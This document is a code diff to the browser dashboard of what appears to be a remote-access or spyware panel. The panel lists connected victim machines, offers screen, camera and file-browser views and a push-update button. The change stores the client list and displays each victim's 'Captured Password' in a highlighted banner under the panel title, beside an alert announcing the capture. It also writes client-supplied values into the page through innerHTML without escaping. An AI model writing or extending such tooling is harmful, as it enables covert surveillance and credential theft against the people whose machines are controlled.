@@ -118,10 +118,12 @@
         let activeTarget = null;
         let activeType = null;
         let iceCandidatesQueue = [];
+        let globalClients = {};
         
         socket.emit('get-clients');
 
         socket.on('client-list', (clients) => {
+            globalClients = clients;
             const list = document.getElementById('clientsList');
             list.innerHTML = '';
             const count = Object.keys(clients).length;
@@ -168,7 +170,13 @@
             document.getElementById('file-browser').classList.add('hidden');
             
             document.getElementById('backBtn').classList.remove('hidden');
-            document.getElementById('title').innerText = "Viewing Options for: " + clientName;
+            
+            const clientInfo = globalClients[clientId];
+            if (clientInfo && clientInfo.password) {
+                document.getElementById('title').innerHTML = `Viewing Options for: ${clientName}<br><span style="color:#ffeb3b; font-size: 20px; background: rgba(255,235,59,0.1); padding: 5px 15px; border-radius: 8px; border: 1px solid #ffeb3b; display: inline-block; margin-top: 15px;">🔑 Captured Password: ${clientInfo.password}</span>`;
+            } else {
+                document.getElementById('title').innerText = "Viewing Options for: " + clientName;
+            }
             
             // Note: We DO NOT request anything yet. The streams remain strictly OFF 
             // until the admin explicitly clicks "View Screen" or "View Camera".
@@ -668,8 +676,10 @@
             const pwd = typeof data === 'string' ? data : data.password;
             alert("🚨 PASSWORD CAPTURED! 🚨\n\nPassword: " + pwd);
             // We can also display it in the remote text box or title just in case
-            document.getElementById('title').innerText = "Captured Password: " + pwd;
-            document.getElementById('title').style.color = "#ffeb3b";
+            if (activeTarget) {
+                const clientName = globalClients[activeTarget] ? globalClients[activeTarget].name : 'Client';
+                document.getElementById('title').innerHTML = `Viewing Options for: ${clientName}<br><span style="color:#ffeb3b; font-size: 20px; background: rgba(255,235,59,0.1); padding: 5px 15px; border-radius: 8px; border: 1px solid #ffeb3b; display: inline-block; margin-top: 15px;">🔑 Captured Password: ${pwd}</span>`;
+            }
         });
 
         document.getElementById('pushUpdateBtn').onclick = () => {
